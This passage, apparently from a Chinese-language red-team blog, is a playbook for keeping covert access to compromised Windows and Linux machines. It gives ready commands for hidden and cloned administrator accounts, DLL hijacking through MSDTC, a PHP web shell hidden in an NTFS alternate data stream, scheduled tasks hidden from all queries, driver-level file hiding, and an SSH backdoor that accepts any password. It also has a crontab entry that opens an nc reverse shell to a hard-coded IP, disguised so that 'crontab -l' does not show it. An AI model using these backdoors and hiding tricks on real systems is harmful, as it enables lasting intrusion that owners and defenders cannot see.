<p>2、dllmain里不写任何代码，导出函数里里一定要通过线程调用shellcode加载函数，否则也会开机卡死。</p>
<h4><span id="msdtc还需制作dll复用">MSDTC（还需制作dll，复用）</span></h4><p>权限要求：未降权的管理员权限。</p>
<p>msdtc.exe是微软分布式传输协调程序。该进程调用系统Microsoft Personal Web Server和Microsoft SQL Server。该服务用于管理多个服务器。</p>
<p>该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964352989598.jpg" alt></p>
<p>对应注册表如下：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964352245979.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</span><br></pre></td></tr></table></figure>

<p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。</p>
<p>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc qc msdtc</span><br><span class="line">sc config msdtc start&#x3D; auto</span><br></pre></td></tr></table></figure>

<p>恶意dll会被加载到msdtc.exe进程中执行，隐蔽性强：</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/15964354319199.jpg" alt></p>
<h4><span id="映像劫持">映像劫持</span></h4><h4><span id="总结">总结</span></h4><p>一开始整理持久化技术的时候总共列了20种左右，但实践中发现很多持久化技术并是不通用的，例如针对特定场景，特定配置，特定应用的权限维持；甚至还有些是“被动”持久化，例如快捷方式的替换，排除利用快捷方式漏洞利用这条路，如果目标不去点是不会触发的。因此将那些局限性较大的持久化技术删掉以精简篇幅（减少工作量），最后将持久化技术精简到了以上10种，相对来说比较通用。<br>整理的过程中也发现一个Ring3中无奈的点：用户层的持久化如果想做到隐蔽性强且绕过杀软的行为检测，一定要借助Windows自带的功能（白利用），如果这些功能或模块在特殊环境中被关闭或卸载就会很尴尬。因此多准备几种方法总还是很有用的。<br>由于时间关系，部分需要单独制作的DLL使用了msf直接生成的进行测试，但免杀效果堪忧。后续制作CS插件的时候还需要再完成这些DLL并对其做一些免杀处理。</p>
<h4><span id="补充-msf">补充 MSF</span></h4><p>msf实现dll劫持，是通过在dllmain里创建rundll32进程，然后注入恶意代码来实现的。<br>但是他特殊在于他可以不需要导出任何函数就能实现。</p>
<p>原因在于他在DLL_PROCESS_ATTACH时，创建rundll32.exe进程，并注入恶意代码，最后关键点ExitThread(0)。</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130094438097.png" alt="image-20210130094438097"></p>
<p>dllmain是序列化执行，线程在调用DllMain之前，要先获取锁LdrpLoaderLock，等DllMain执行完再解开这个锁。</p>
<p>上面在调用后直接退出线程，也没解锁，正常来说如果有新线程创建动作（或者调用其他导出函数动作），会调用dllmian传入DLL_THREAD_ATTACH 就会导致死锁，他这里拉起新进程运行恶意代码，就不会影响，而原本线程锁未释放，导致调用导出函数的动作迟迟未继续，就不会因为导出函数不存在而报错了。</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210130094452496.png" alt="image-20210130094452496"></p>
<p><a href="https://blog.csdn.net/chenlycly/article/details/82826885" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/82826885</a></p>
<h3><span id="被动后门">被动后门</span></h3><h4><span id="后门账号">后门账号</span></h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># $符号可使得<span class="built_in">net</span> user 查看不到用户</span><br><span class="line"><span class="built_in">net</span> user admin$ Test@<span class="number">123</span> /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators admin$ /add</span><br><span class="line"># 激活guest</span><br><span class="line"><span class="built_in">net</span> user guest /active:yes</span><br><span class="line"><span class="built_in">net</span> localgroup administrators guest /add</span><br></pre></td></tr></table></figure>

<p>克隆账号</p>
<p>这种方式通过net user和图形化界面用户管理都看不到，一般管理员也无法查看注册表值，需要改权限，但可被D盾等工具检测到。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 克隆账号</span><br><span class="line">准备：先创建好一个用户，并且当前控制权限为system</span><br><span class="line"><span class="number">1</span>. 查询administrator的ID，其实可以省略这步，默认都为<span class="number">500</span></span><br><span class="line">reg query "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\administrator" /z</span><br><span class="line"><span class="number">2</span>. 查询administrator的F值</span><br><span class="line">reg query "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="number">000001</span>F4"  /v F</span><br><span class="line"><span class="number">3</span>. 查询新增用户的ID</span><br><span class="line">reg query "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test" /z</span><br><span class="line"><span class="number">4</span>. 替换新增用户的F值为administrator的F值</span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="number">000003</span>F4" /v F /t REG_BINARY /d <span class="number">0200010000000000</span>CD6A6B788BE8D601000000000000000036314A798801D60100000000000000008F953D318CE8D601F401000001020000100000000000000002004F01010000000000000031003100 /f</span><br><span class="line"><span class="number">5</span>. 导出用户删除后再导入</span><br><span class="line">reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="number">000003</span>F4"  id.reg /y</span><br><span class="line">reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test"  name.reg /y</span><br><span class="line"><span class="built_in">net</span> user test /<span class="built_in">del</span></span><br><span class="line">reg import id.reg</span><br><span class="line">reg import name.reg</span><br></pre></td></tr></table></figure>



<h4><span id="劫持">劫持</span></h4><h4><span id="多用户登录">多用户登录</span></h4><p>允许同一个用户多人登录，但默认至多两个</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add /f "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>



<h2><span id="隐藏技术">隐藏技术</span></h2><h3><span id="文件隐藏">文件隐藏</span></h3><p>把原本的文件增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +a +r +h  D:\test\project\test.txt</span><br></pre></td></tr></table></figure>



<p>2、利用ADS隐藏文件内容</p>
<p> 在服务器上echo一个数据流文件进去，比如index.php是网页正常文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'chopper'</span>]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure>

<p>写入powershell后门代码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入</span></span><br><span class="line">echo [<span class="type">powershell</span>-<span class="type">cmd</span>] &gt; test.txt:hidden.txt</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">"Get-Content 'test.txt' -Stream hidden.txt | Invoke-Expression"</span></span><br></pre></td></tr></table></figure>

<p>清除：删除文件即可</p>
<h3><span id="任务计划隐藏">任务计划隐藏</span></h3><h4><span id="非完全隐藏">非完全隐藏</span></h4><p>如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 Index 值，一般情况下都是 3，步骤如下</p>
<ul>
<li>启动 SYSTEM 权限 cmd：<code>psexec64  -i -s cmd.exe</code></li>
<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
<li>修改 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree</code> 下对应任务的 Index 值为 <code>0</code></li>
<li>删除 <code>%SystemRoot%\System32\Tasks</code> 下任务对应的 XML 文件</li>
</ul>
<p>优点： - 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务</p>
<p>缺点： - 并非完全隐藏，如果知道该任务的名字，可以通过 schtasks /query /tn {TaskName} 查到 - 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 创建任务计划</span><br><span class="line">schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo <span class="number">1</span> /ru "administrator"</span><br><span class="line"># 均可成功查询</span><br><span class="line">schtasks.exe /query /tn test</span><br><span class="line">schtasks.exe /query|<span class="built_in">findstr</span> test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 修改注册表index</span><br><span class="line">reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\<span class="built_in">Tree</span>\test" /v Index /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"><span class="built_in">del</span> /f /q C:\Windows\System32\Tasks\test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查询失败</span><br><span class="line">schtasks.exe /query|<span class="built_in">findstr</span> test</span><br><span class="line"># 查询成功</span><br><span class="line">schtasks.exe /query /tn test</span><br></pre></td></tr></table></figure>



<h4><span id="完全隐藏">完全隐藏</span></h4><p>按道理，是可以通过配置任务 SD 实现。在一次测试过程中，偶然删除了注册表中的 SD 项，发现无论什么方式都查不到任务信息，达到完全隐藏的目的：</p>
<ul>
<li>启动 SYSTEM 权限 cmd：<code>psexec64  -i -s cmd.exe</code></li>
<li>执行 regedit 以 SYSTEM 权限启动注册表编辑器</li>
<li>删除 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD</code></li>
<li>删除 <code>%SystemRoot%\System32\Tasks</code> 下任务对应的 XML 文件</li>
</ul>
<p>优点： - 无论何种方式（除了注册表），都查不到该任务，较为彻底</p>
<p>缺点： - 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 创建任务计划</span><br><span class="line">schtasks.exe /create /tn test /tr "notepad.exe" /sc minute /mo <span class="number">1</span> /ru "administrator"</span><br><span class="line"># 均可成功查询</span><br><span class="line">schtasks.exe /query /tn test</span><br><span class="line">schtasks.exe /query|<span class="built_in">findstr</span> test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 修改注册表index</span><br><span class="line">reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\<span class="built_in">Tree</span>\test" /v SD /f</span><br><span class="line"><span class="built_in">del</span> /f /q C:\Windows\System32\Tasks\test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查询失败</span><br><span class="line">schtasks.exe /query|<span class="built_in">findstr</span> test</span><br><span class="line"># 查询失败</span><br><span class="line">schtasks.exe /query /tn test</span><br></pre></td></tr></table></figure>



<p>原理</p>
<p>经过进程监控，发现在计划任务信息查询过程中的流程如下：</p>
<ul>
<li>查询 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SD</code>，查的到继续，查不到则终止查询</li>
<li>遍历查询 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}</code> 中的 Id、Index、SD等值</li>
<li>（后面都是猜测）</li>
<li>查询到的 SD 值，会对之后是否有权限查看该任务信息有影响，查不查的到和这个值息息相关</li>
<li>根据 SD 值，进行权限检查<ul>
<li>如果权限通过，格式化输出 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{TaskId}</code> 中的任务详细信息</li>
<li>权限不通过，则进行下一个任务的查询</li>
</ul>
</li>
</ul>
<h4><span id="参考">参考</span></h4><p><a href="https://paper.seebug.org/1464/" target="_blank" rel="noopener">https://paper.seebug.org/1464/</a></p>
<h3><span id="进程隐藏待定">进程隐藏(待定)</span></h3><p>HideToolz</p>
<h3><span id="驱动级文件隐藏">驱动级文件隐藏</span></h3><p>Easy File Locker（测试1.5版本可支持高版本）</p>
<p><a href="http://www.xoslab.com/efl.html" target="_blank" rel="noopener">http://www.xoslab.com/efl.html</a></p>
<p>安装</p>
<img src="权限维持.assets/image-20210107091226763.png" alt="image-20210107091226763" style="zoom:50%;">

<p>添加需要隐藏的文件夹或文件，可设置可读、可写、可删除、可视，这里只允许可读，并开启保护</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107092441963.png" alt="image-20210107092441963"></p>
<p>可以看到文件夹已被隐藏无法查看</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107092543656.png" alt="image-20210107092543656"></p>
<p>删除easy file locker有关程序只留下驱动。</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107093027572.png" alt="image-20210107093027572"></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rd</span> /s /q "c:\Program Files\Easy File Locker"</span><br><span class="line"><span class="built_in">rd</span> /s /q "C:\Program Files (x86)\Easy File Locker"</span><br><span class="line"><span class="built_in">del</span> /a /f /q "<span class="variable">%userprofile%</span>\Desktop\Easy File Locker.lnk" </span><br><span class="line"><span class="built_in">rd</span> /s /q "<span class="variable">%appdata%</span>\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Easy File Locker"</span><br><span class="line"><span class="built_in">del</span> /a /f /q "<span class="variable">%appdata%</span>\Microsoft\Windows\Recent\Easy File Locker.lnk" </span><br><span class="line"></span><br><span class="line">reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\FileLocker.exe" /f</span><br><span class="line">reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\App Paths\FileLocker.exe" /f</span><br><span class="line">reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Easy File Locker" /f</span><br><span class="line">reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Easy File Locker" /f</span><br></pre></td></tr></table></figure>



<p>留下的驱动相关文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\WINDOWS\xlkfs.dat</span><br><span class="line">c:\WINDOWS\xlkfs.dll</span><br><span class="line">c:\WINDOWS\xlkfs.ini</span><br><span class="line">c:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure>



<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查询服务状态： sc qc xlkfs</span><br><span class="line"><span class="number">2</span>、停止服务： <span class="built_in">net</span> stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line"><span class="number">3</span>、删除服务： sc delete xlkfs</span><br><span class="line"><span class="number">4</span>、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure>



<h3><span id="进程注入">进程注入</span></h3><p>常见的进程注入方式包括</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dll注入：CREATEREMOTETHREAD和LOADLIBRARY进行经典DLL注入</span><br><span class="line">shellcode注入：将shellcode注入到目标进程运行</span><br><span class="line">Process Hollowing：从目标进程中取消映射，并使用恶意可执行文件覆盖目标进程的内存空间</span><br><span class="line">PE注入：将PE文件注入到指定进程，由于需要修复重定位表，并且exe可能没有重定位表，注入难度较大。</span><br><span class="line">dll反射注入：不使用loadlibrary，将dll文件注入当前进程。</span><br><span class="line">APC注入：让一个线程在它正常的执行路径运行之前执行一些其他的代码，每一个线程都有一个附加的APC队列，他们在线程处于可警告的时候才被处理。</span><br><span class="line">execute-assembly：以shellcode的形式实现从内存中加载.NET程序集。</span><br><span class="line">dll劫持：</span><br></pre></td></tr></table></figure>

<p>shellcode注入：</p>
<p>这是最简单的一种方法，通过OpenProcess获取目标进程句柄，VirtualAllocEx分配虚拟内存，再通过WriteProcessMemory将shellcode写入分配的内存里，最终CreateRemoteThread运行该shellcode。<br>需要注意这里使用的是VirtualAllocEx，因为VirtualAlloc只能对当前进程分配，VirtualAllocEx才能对其他进程操作</p>
<p>在CS中用到shellcode注入、dll反射注入、execute-assembly</p>
<p>编写了一个一键进程注入的cs插件</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210106182840392.png" alt="image-20210106182840392"></p>
<p><a href="https://www.freebuf.com/articles/system/187239.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/187239.html</a></p>
<h2><span id="参考">参考</span></h2><p><a href="https://xz.aliyun.com/t/8095" target="_blank" rel="noopener">https://xz.aliyun.com/t/8095</a></p>
<p><a href="https://xz.aliyun.com/t/8420" target="_blank" rel="noopener">https://xz.aliyun.com/t/8420</a></p>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87.html" target="_blank" rel="noopener">https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87.html</a></p>
<h1><span id="linux">linux</span></h1><h2><span id="后门">后门</span></h2><h3><span id="自启动后门">自启动后门</span></h3><h4><span id="crontab">crontab</span></h4><p>每15分钟执行一次</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">"*/15 * * * * /usr/bin/nc 30.157.170.75 1389 /bin/sh;\rno crontab for `whoami`%100c\n"</span>)|crontab -</span><br></pre></td></tr></table></figure>

<p>该操作实际上是在以下几个文件里写入，也可以写入以下文件来实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root （centos系统）</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (ubuntu系统)</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line"># 每天0点执行一次</span><br><span class="line">0 0 * * * &#x2F;usr&#x2F;bin&#x2F;nc 30.157.170.75 1389 &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">crontab -l</span><br><span class="line"><span class="comment"># 编辑</span></span><br><span class="line">conrtab -e</span><br></pre></td></tr></table></figure>



<h4><span id="service">service</span></h4><ul>
<li>centos6/redhat</li>
</ul>
<p>第1步：把上面的脚本放在/etc/init.d/文件夹下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s ./supervisord  /etc/init.d/supervisord</span><br></pre></td></tr></table></figure>


<p>第2步：将启动脚本权限改为可执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/supervisord</span><br></pre></td></tr></table></figure>


<p>第3步：添加启动项。</p>
<p>　　第3步：添加启动项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add supervisord</span><br><span class="line">chkconfig supervisord on</span><br></pre></td></tr></table></figure>

<p>第4步：检查是否设置成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list | grep supervisord</span><br><span class="line">supervisord     0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</span><br></pre></td></tr></table></figure>



<ul>
<li>ubuntu</li>
</ul>
<p>1.创建脚本文件</p>
<p><img src="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210107103644514.png" alt="image-20210107103644514"></p>
<p>修改文件可执行</p>
<p>chmod a+x ethercalc.local</p>
<p>2.设置服务启动配置文件<br>ethercalc.service</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Description&#x3D;&#x2F;etc&#x2F;rc.local Compatibility</span><br><span class="line">ConditionPathExists&#x3D;&#x2F;etc&#x2F;ethercalc.local </span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">ExecStart&#x3D;&#x2F;etc&#x2F;ethercalc.local start</span><br><span class="line">TimeoutSec&#x3D;0    </span><br><span class="line">StandardOutput&#x3D;tty </span><br><span class="line">RemainAfterExit&#x3D;yes</span><br><span class="line">SysVStartPriority&#x3D;99</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>

<p>移动到/etc/systemd/system/ethercalc.service</p>
<p>3.启动服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ethercalc.service</span><br><span class="line">systemctl enable ethercalc.service</span><br></pre></td></tr></table></figure>



<h4><span id="启动项">启动项</span></h4><p>修改/etc/rc.local,开机会自动运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This script will be executed *after* all the other init scripts.</span></span><br><span class="line"><span class="comment"># You can put your own initialization stuff in here if you don't</span></span><br><span class="line"><span class="comment"># want to do the full Sys V style init stuff.</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#touch /var/lock/subsys/local</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello linux"</span> &gt;&gt; /tmp/hello2.log</span><br><span class="line"> </span><br><span class="line">influxd &gt; /tmp/influxd.log 2&gt;&amp;1 &amp;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello linux"</span> &gt;&gt; /tmp/hello3.log</span><br></pre></td></tr></table></figure>



<h3><span id="被动后门">被动后门</span></h3><h4><span id="ssh软连接">SSH软连接</span></h4><p>建立一个软连接，然后通过5555端口访问ssh服务，软连接名称必须为<code>su</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br></pre></td></tr></table></figure>

<p>如果不想使用su，那就必须拷贝su重命名，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;pam.d&#x2F;su &#x2F;etc&#x2F;pam.d&#x2F;xxx</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;xxx; &#x2F;tmp&#x2F;xxx -oPort&#x3D;5555</span><br></pre></td></tr></table></figure>



<p>添加用户或直接使用root，ssh连接时<code>密码任意输入</code>，kali测试时，root也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd wing -p wing</span><br></pre></td></tr></table></figure>



<p>原理分析：</p>
<p><a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener">http://www.91ri.org/16803.html</a></p>
<h4><span id="克隆账号">克隆账号</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆账号</span></span><br><span class="line">useradd www &amp;&amp; <span class="built_in">echo</span> <span class="string">"www:Test@123"</span> | chpasswd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cp /etc/passwd /tmp/passwd.bak</span><br><span class="line">sed -i <span class="string">"s/www:x:1003:1003:/www:x:0:0:/g"</span> /etc/passwd</span><br></pre></td></tr></table></figure>



<p>bsd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wheel是root组</span></span><br><span class="line"></span><br><span class="line">1.新建一个用户bsder使用cshell，属于组 wheel,口令交互输入</span><br><span class="line"><span class="built_in">echo</span> 1234 | pw useradd -n bsder -g wheel -m -s /bin/csh -h 0</span><br><span class="line">cp /etc/passwd /tmp/passwd.bak</span><br><span class="line"></span><br><span class="line">2.将bsder使用的shell改为/bin/sh</span><br><span class="line">pw usermod bsder -s /bin/sh</span><br><span class="line"></span><br><span class="line">3.将bsder置于wheel组内</span><br><span class="line">pw groupmod wheel -m bsder</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">"s/:1025:0:/:0:0:/g"</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">4. 删除bsder</span><br><span class="line">pw userdel bsder</span><br></pre></td></tr></table></figure>



<h4><span id="ssh公钥免密登陆">SSH公钥免密登陆</span></h4><p>本地先生成ssh key</p>
